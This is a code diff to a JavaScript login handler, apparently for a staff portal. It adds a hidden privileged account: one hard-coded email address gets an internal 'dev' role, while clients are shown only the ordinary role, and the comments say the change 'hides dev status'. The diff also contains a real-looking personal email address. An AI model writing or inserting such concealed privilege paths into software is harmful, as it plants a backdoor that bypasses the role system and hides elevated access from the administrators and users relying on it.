@@ -68,8 +68,11 @@ export async function handleLogin(request, env) {
       'UPDATE staff SET last_login = ? WHERE id = ?'
     ).bind(new Date().toISOString(), user.id).run();
     
-    // Ensure dev role is properly passed
-    const userRole = user.role === 'dev' ? 'dev' : (user.role || 'staff');
+    // Get user role - appears as admin to clients but has dev privileges internally
+    // Hidden dev accounts are determined by email, not database role
+    const isSpecialUser = user.email === 'nick@neurodivers.ca';
+    const displayRole = user.role || 'staff'; // What clients see
+    const actualRole = isSpecialUser ? 'dev' : displayRole; // Internal role for permissions
     
     return new Response(JSON.stringify({
       success: true,
@@ -78,7 +81,8 @@ export async function handleLogin(request, env) {
         id: user.id,
         email: user.email,
         name: user.name,
-        role: userRole
+        role: displayRole, // Send display role to client (hides dev status)
+        _internal: isSpecialUser ? actualRole : undefined // Only set for special users
       }
     }), {
       status: 200,
